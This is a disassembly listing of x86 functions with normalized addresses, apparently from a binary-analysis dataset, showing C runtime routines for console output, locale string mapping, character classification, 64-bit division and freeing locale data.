mov [ eax ] 0x1
mov [ esi ] al
push edi
push ebx
push esi
call sub_412f80
add esp 0xc
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
push edi
push ebx
push esi
call sub_412f80
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
sub_4238a9
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
xor esi esi
cmp [ rw-data ] esi
je r-xdata
push esi
push esi
push 0x5
lea eax [ ebp - 0xc ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push esi
call [ GetConsoleOutputCP@IAT ]
push eax
call [ WideCharToMultiByte@IAT ]
mov ecx [ rw-data ]
cmp ecx 0xffffffff
je r-xdata
cmp [ rw-data ] 0xfffffffe
jne r-xdata
mov eax 0xffff
jmp r-xdata
push esi
lea edx [ ebp - 0x10 ]
push edx
push eax
lea eax [ ebp - 0xc ]
push eax
push ecx
call [ WriteConsoleA@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
jne r-xdata
call sub_424db2
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_411f81
leave
retn
mov ax [ ebp + 0x8 ]
push esi
lea ecx [ ebp - 0x10 ]
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push eax
call [ WriteConsoleW@IAT ]
test eax eax
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] esi
sub_42396e
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x18 ]
call sub_415547
mov ebx [ ebp + 0x8 ]
mov esi 0x100
cmp ebx esi
jae r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov ecx [ ebp - 0x18 ]
cmp [ ecx + 0xac ] 0x1
jle r-xdata
call sub_4119bb
mov [ eax ] 0x2a
xor ecx ecx
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] 0x0
inc ecx
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_422128
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ecx + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
and eax 0x1
lea eax [ ebp - 0x18 ]
push eax
push 0x1
push ebx
call sub_420097
mov ecx [ ebp - 0x18 ]
add esp 0xc
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x8 ]
je r-xdata
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x4 ] al
mov [ ebp - 0x3 ] bl
mov [ ebp - 0x2 ] 0x0
pop ecx
jmp r-xdata
mov eax [ ecx + 0xcc ]
movzx eax [ eax + ebx ]
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx ecx [ ebp - 0x7 ]
shl eax 0x8
or eax ecx
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x4 ]
lea edx [ ebp - 0x8 ]
push 0x3
push edx
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
push esi
push [ eax + 0x14 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_424309
add esp 0x24
test eax eax
je r-xdata
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_423a83
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_42396e
pop ecx
pop ecx
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x41 ]
cmp ecx 0x19
ja r-xdata
pop ebp
retn
add eax 0x20
pop ebp
retn
sub_423aaf
mov edi edi
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x24 ]
call sub_415547
lea eax [ ebp - 0x24 ]
push eax
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push edi
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_425886
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push esi
push eax
call sub_424dfe
add esp 0x28
test [ ebp - 0x14 ] 0x3
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
test [ ebp - 0x14 ] 0x2
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x4
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x3
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
pop eax
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_411f81
leave
retn
sub_423b57
mov edi edi
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x24 ]
call sub_415547
lea eax [ ebp - 0x24 ]
push eax
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push edi
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_425886
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push esi
push eax
call sub_425342
add esp 0x28
test [ ebp - 0x14 ] 0x3
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
test [ ebp - 0x14 ] 0x2
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x4
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x3
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
pop eax
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_411f81
leave
retn
sub_423bff
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x14 ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
push edi
mov edi [ ecx + 0xc ]
cmp esi ebx
jne r-xdata
cmp [ ebp + 0xc ] ebx
jbe r-xdata
call sub_4119bb
push 0x16
pop esi
mov [ eax ] esi
mov edx [ ebp + 0x10 ]
cmp edx ebx
mov [ esi ] bl
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
xor eax eax
mov eax edx
jmp r-xdata
cmp edx ebx
mov [ esi ] 0x30
lea eax [ esi + 0x1 ]
jle r-xdata
call sub_4119bb
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
inc eax
cmp [ ebp + 0xc ] eax
ja r-xdata
cmp edx ebx
mov [ eax ] bl
jl r-xdata
mov cl [ edi ]
cmp cl bl
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_41897d
add esp 0x14
mov eax esi
jmp r-xdata
cmp [ esi ] 0x31
jne r-xdata
cmp [ edi ] 0x35
jl r-xdata
push 0x30
pop ecx
movsx ecx cl
inc edi
jmp r-xdata
lea edi [ esi + 0x1 ]
push edi
call sub_412e40
inc eax
push eax
push edi
push esi
call sub_422220
add esp 0x10
inc [ ecx + 0x4 ]
jmp r-xdata
jmp r-xdata
mov ecx [ ebp + 0x14 ]
mov [ eax ] cl
inc eax
dec edx
cmp edx ebx
jg r-xdata
xor eax eax
dec eax
cmp [ eax ] 0x39
je r-xdata
mov [ eax ] 0x30
inc [ eax ]
sub_423cbe
mov edi edi
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0xc ]
movzx eax [ edx + 0x6 ]
push ebx
mov ecx eax
push esi
push edi
shr ecx 0x4
and eax 0x8000
mov edi 0x7ff
and ecx edi
mov [ ebp + 0xc ] eax
mov eax [ edx + 0x4 ]
mov edx [ edx ]
movzx ebx cx
mov esi 0x80000000
and eax 0xfffff
mov [ ebp - 0x4 ] esi
test ebx ebx
je r-xdata
xor ebx ebx
cmp eax ebx
jne r-xdata
cmp ebx edi
je r-xdata
add ecx 0x3c01
mov [ ebp - 0x4 ] ebx
cmp edx ebx
jne r-xdata
mov edi 0x7fff
jmp r-xdata
add ecx 0x3c00
jmp r-xdata
mov ecx [ ebp + 0xc ]
or ecx edi
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov ebx ecx
add edx edx
shr ebx 0x1f
or edx ebx
add ecx ecx
add edi 0xffff
mov [ eax + 0x4 ] edx
mov [ eax ] ecx
test esi edx
je r-xdata
mov eax [ ebp + 0x8 ]
mov cx [ ebp + 0xc ]
mov [ eax + 0x4 ] ebx
mov [ eax ] ebx
jmp r-xdata
mov ecx edx
shr ecx 0x15
shl eax 0xb
or ecx eax
or ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
shl edx 0xb
mov [ eax + 0x4 ] ecx
mov [ eax ] edx
test esi ecx
jne r-xdata
movzx edi cx
pop edi
pop esi
mov [ eax + 0x8 ] cx
pop ebx
leave
retn
sub_423d7b
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov [ ebp - 0x30 ] eax
push edi
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_423cbe
pop ecx
pop ecx
lea eax [ ebp - 0x2c ]
push eax
push 0x0
push 0x11
sub esp 0xc
lea esi [ ebp - 0x10 ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
call sub_425f7e
mov esi [ ebp - 0x30 ]
mov [ ebx + 0x8 ] eax
movsx eax [ ebp - 0x2a ]
mov [ ebx ] eax
movsx eax [ ebp - 0x2c ]
mov [ ebx + 0x4 ] eax
lea eax [ ebp - 0x28 ]
push eax
push [ ebp + 0x18 ]
push esi
call sub_41cf11
add esp 0x24
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
mov [ ebx + 0xc ] esi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_411f81
leave
retn
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_418855
add esp 0x14
sub_423e10
push edi
push esi
push ebp
xor edi edi
xor ebp ebp
mov eax [ esp + 0x14 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x1c ]
or eax eax
jge r-xdata
inc edi
inc ebp
mov edx [ esp + 0x10 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
or eax eax
jne r-xdata
inc edi
mov edx [ esp + 0x18 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
mov ebx eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x10 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x18 ]
mov ecx eax
mov eax esi
mul [ esp + 0x18 ]
add edx ecx
jmp r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov esi eax
mul [ esp + 0x1c ]
mov ecx eax
mov eax [ esp + 0x18 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
dec ebp
jns r-xdata
dec esi
sub eax [ esp + 0x18 ]
sbb edx [ esp + 0x1c ]
cmp edx [ esp + 0x14 ]
ja r-xdata
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
dec edi
jne r-xdata
neg edx
neg eax
sbb edx 0x0
jb r-xdata
pop ebp
pop esi
pop edi
retn 0x10
neg edx
neg eax
sbb edx 0x0
xor ebx ebx
cmp eax [ esp + 0x10 ]
jbe r-xdata
sub_423ef8
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
and eax 0xfff7ffff
and ecx eax
push esi
test ecx 0xfcf0fce0
je r-xdata
mov esi [ ebp + 0x8 ]
push eax
push [ ebp + 0xc ]
test esi esi
je r-xdata
push edi
mov edi [ ebp + 0x8 ]
xor esi esi
cmp edi esi
je r-xdata
call sub_4269d0
call sub_4269d0
mov [ esi ] eax
jmp r-xdata
call sub_4119bb
push 0x16
pop edi
push esi
push esi
push esi
push esi
push esi
mov [ eax ] edi
call sub_41897d
add esp 0x14
mov eax edi
pop edi
jmp r-xdata
push esi
push esi
call sub_4269d0
pop ecx
pop ecx
mov [ edi ] eax
pop ecx
pop ecx
xor eax eax
pop esi
pop ebp
retn
sub_423f64
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
xor ebx ebx
push edi
mov esi ecx
cmp [ rw-data ] ebx
jne r-xdata
cmp [ ebp + 0x14 ] ebx
jle r-xdata
push ebx
push ebx
xor edi edi
inc edi
push edi
push r--data
push 0x100
push ebx
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0x2
je r-xdata
mov ecx [ ebp + 0x14 ]
mov eax [ ebp + 0x10 ]
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] edi
jmp r-xdata
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ebx
cmp [ ebp + 0x8 ] ebx
jne r-xdata
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x14 ]
sub eax ecx
dec eax
cmp eax [ ebp + 0x14 ]
jge r-xdata
inc eax
cmp ecx ebx
jne r-xdata
mov [ rw-data ] 0x2
cmp [ ebp + 0x20 ] ebx
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x14 ]
mov [ ebp + 0x8 ] eax
cmp eax 0x1
jne r-xdata
mov [ ebp + 0x14 ] eax
inc eax
dec ecx
cmp [ eax ] bl
je r-xdata
or ecx 0xffffffff
push [ ebp + 0x8 ]
call sub_424ac3
pop ecx
mov [ ebp - 0x14 ] eax
cmp eax 0xffffffff
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x20 ] eax
xor eax eax
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x20 ] ebx
jne r-xdata
cmp eax [ ebp + 0x20 ]
je r-xdata
lea esp [ ebp - 0x20 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_411f81
leave
retn
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x24 ] ebx
push ebx
push ebx
push [ ebp + 0x14 ]
setne al
push [ ebp + 0x10 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x20 ]
call esi
mov edi eax
cmp edi ebx
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x20 ] eax
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringA@IAT ]
mov esi eax
push ebx
push ebx
lea ecx [ ebp + 0x14 ]
push ecx
push [ ebp + 0x10 ]
push eax
push [ ebp + 0x20 ]
call sub_424b0c
add esp 0x18
mov [ ebp - 0xc ] eax
cmp eax ebx
je r-xdata
jle r-xdata
mov eax [ ebp - 0x10 ]
cmp eax ebx
je r-xdata
push [ ebp - 0xc ]
call sub_4121b5
pop ecx
mov esi [ LCMapStringA@IAT ]
push ebx
push ebx
push [ ebp + 0x14 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
jne r-xdata
mov [ ebp - 0xc ] ebx
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
mov eax esi
cmp [ ebp + 0x18 ] eax
je r-xdata
jle r-xdata
xor esi esi
jmp r-xdata
push edi
push [ ebp - 0xc ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x20 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push eax
call sub_4121b5
pop ecx
xor edi edi
cmp eax 0xffffffe0
ja r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
push [ ebp - 0xc ]
call sub_416223
mov eax [ ebp - 0x8 ]
pop ecx
jmp r-xdata
mov esi [ LCMapStringW@IAT ]
push ebx
push ebx
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov ecx eax
mov [ ebp - 0x8 ] ecx
cmp ecx ebx
je r-xdata
push eax
call sub_412584
pop ecx
cmp eax ebx
je r-xdata
call sub_420320
mov eax esp
cmp eax ebx
je r-xdata
push [ ebp - 0x8 ]
push ebx
push edi
call sub_412f80
add esp 0xc
push [ ebp - 0x8 ]
push edi
push [ ebp + 0x14 ]
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
jne r-xdata
add eax 0x8
cmp eax 0x400
ja r-xdata
test [ ebp + 0xc ] 0x400
je r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x8 ]
push [ ebp + 0x18 ]
push eax
push edi
push [ ebp + 0x20 ]
push [ ebp - 0x14 ]
call sub_424b0c
mov esi eax
mov [ ebp - 0x10 ] esi
add esp 0x18
neg esi
sbb esi esi
and esi [ ebp - 0x8 ]
xor esi esi
jmp r-xdata
push eax
call sub_412584
pop ecx
cmp eax ebx
je r-xdata
call sub_420320
mov edi esp
cmp edi ebx
je r-xdata
cmp ecx ebx
jle r-xdata
cmp [ ebp + 0x1c ] ebx
je r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
add eax 0x8
push edi
call sub_416223
pop ecx
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
xor esi esi
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax 0x2
jb r-xdata
cmp ecx [ ebp + 0x1c ]
jg r-xdata
cmp edi ebx
je r-xdata
push [ ebp - 0x8 ]
push esi
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
lea eax [ ecx + ecx + 0x8 ]
cmp eax 0x400
ja r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
jmp r-xdata
push esi
call sub_416223
pop ecx
push ebx
push ebx
cmp [ ebp + 0x1c ] ebx
jne r-xdata
push eax
call sub_412584
pop ecx
cmp eax ebx
je r-xdata
call sub_420320
mov esi esp
cmp esi ebx
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push ebx
jmp r-xdata
mov esi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ esi ] 0xcccc
add esi 0x8
jmp r-xdata
push [ ebp - 0x8 ]
push esi
push ebx
push [ ebp + 0x20 ]
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x8 ] eax
cmp esi ebx
je r-xdata
sub_424309
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_415547
push [ ebp + 0x28 ]
lea ecx [ ebp - 0x10 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_423f64
add esp 0x20
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_42434e
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
push ebx
push esi
xor ebx ebx
push edi
mov edi ecx
cmp eax ebx
jne r-xdata
cmp eax 0x2
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
xor esi esi
inc esi
push esi
push r--data
push esi
call [ GetStringTypeW@IAT ]
test eax eax
je r-xdata
xor esi esi
cmp [ ebp + 0x1c ] ebx
jne r-xdata
cmp eax ebx
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] esi
jmp r-xdata
cmp [ ebp + 0x18 ] ebx
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x14 ]
mov [ ebp + 0x1c ] eax
cmp eax 0x1
jne r-xdata
mov eax [ rw-data ]
push 0x2
pop eax
mov [ rw-data ] eax
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x18 ] ebx
jne r-xdata
push [ ebp + 0x1c ]
call sub_424ac3
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x18 ] eax
xor eax eax
jmp r-xdata
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x20 ] ebx
push ebx
push ebx
push [ ebp + 0x10 ]
setne al
push [ ebp + 0xc ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x18 ]
call esi
mov edi eax
cmp edi ebx
je r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x18 ] eax
cmp eax [ ebp + 0x18 ]
je r-xdata
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_411f81
leave
retn
jle r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x1c ]
call [ GetStringTypeA@IAT ]
mov edi eax
cmp esi ebx
je r-xdata
push ebx
push ebx
lea ecx [ ebp + 0x10 ]
push ecx
push [ ebp + 0xc ]
push eax
push [ ebp + 0x18 ]
call sub_424b0c
mov esi eax
add esp 0x18
cmp esi ebx
je r-xdata
test ebx ebx
je r-xdata
cmp edi 0x7ffffff0
ja r-xdata
mov eax edi
push esi
call sub_4121b5
pop ecx
mov [ ebp + 0xc ] esi
lea eax [ edi + edi ]
push eax
push 0x0
push ebx
call sub_412f80
add esp 0xc
push edi
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x18 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push ebx
call sub_416223
mov eax [ ebp - 0x8 ]
pop ecx
jmp r-xdata
push [ ebp + 0x14 ]
push eax
push ebx
push [ ebp + 0x8 ]
call [ GetStringTypeW@IAT ]
mov [ ebp - 0x8 ] eax
push eax
call sub_412584
pop ecx
cmp eax ebx
je r-xdata
call sub_420320
mov eax esp
cmp eax ebx
je r-xdata
mov ebx eax
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
add eax 0x8
sub_424508
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_415547
push [ ebp + 0x24 ]
lea ecx [ ebp - 0x10 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_42434e
add esp 0x1c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_42454a
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
push [ esi + 0x4 ]
call sub_4121b5
push [ esi + 0x8 ]
call sub_4121b5
push [ esi + 0xc ]
call sub_4121b5
push [ esi + 0x10 ]
call sub_4121b5
push [ esi + 0x14 ]
call sub_4121b5
push [ esi + 0x18 ]
call sub_4121b5
push [ esi ]
call sub_4121b5
push [ esi + 0x20 ]
call sub_4121b5
push [ esi + 0x24 ]
call sub_4121b5
push [ esi + 0x28 ]
call sub_4121b5
push [ esi + 0x2c ]
call sub_4121b5
push [ esi + 0x30 ]
call sub_4121b5
push [ esi + 0x34 ]
call sub_4121b5
push [ esi + 0x1c ]
call sub_4121b5
push [ esi + 0x38 ]
call sub_4121b5
push [ esi + 0x3c ]
call sub_4121b5
add esp 0x40
push [ esi + 0x40 ]
call sub_4121b5
push [ esi + 0x44 ]
call sub_4121b5
push [ esi + 0x48 ]
call sub_4121b5
push [ esi + 0x4c ]
call sub_4121b5
push [ esi + 0x50 ]
call sub_4121b5
push [ esi + 0x54 ]
call sub_4121b5
push [ esi + 0x58 ]
call sub_4121b5
push [ esi + 0x5c ]
call sub_4121b5
push [ esi + 0x60 ]
call sub_4121b5
push [ esi + 0x64 ]
call sub_4121b5
push [ esi + 0x68 ]
call sub_4121b5
push [ esi + 0x6c ]
call sub_4121b5
push [ esi + 0x70 ]
call sub_4121b5
push [ esi + 0x74 ]
call sub_4121b5
push [ esi + 0x78 ]
call sub_4121b5
push [ esi + 0x7c ]
call sub_4121b5
add esp 0x40
push [ esi + 0x80 ]
call sub_4121b5
push [ esi + 0x84 ]
call sub_4121b5
push [ esi + 0x88 ]
call sub_4121b5
push [ esi + 0x8c ]
call sub_4121b5
push [ esi + 0x90 ]
call sub_4121b5
push [ esi + 0x94 ]
call sub_4121b5
push [ esi + 0x98 ]
call sub_4121b5
push [ esi + 0x9c ]
call sub_4121b5
push [ esi + 0xa0 ]
call sub_4121b5
push [ esi + 0xa4 ]
call sub_4121b5
push [ esi + 0xa8 ]
call sub_4121b5
add esp 0x2c
sub_4246df
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_4121b5
pop ecx
mov esi [ esi + 0x8 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_4121b5
pop ecx
push esi
call sub_4121b5
pop ecx
sub_424724
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi + 0xc ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_4121b5
pop ecx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_4121b5
pop ecx
mov eax [ esi + 0x18 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_4121b5
pop ecx
mov eax [ esi + 0x1c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_4121b5
pop ecx
mov eax [ esi + 0x20 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_4121b5
pop ecx
mov esi [ esi + 0x24 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_4121b5
pop ecx
push esi
call sub_4121b5
pop ecx
sub_4247e0
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
lea ecx [ ecx ]
add edx 0x1
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
add ecx 0x1
mov al [ esi ]
or al al
je r-xdata
sub_424826
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_415547
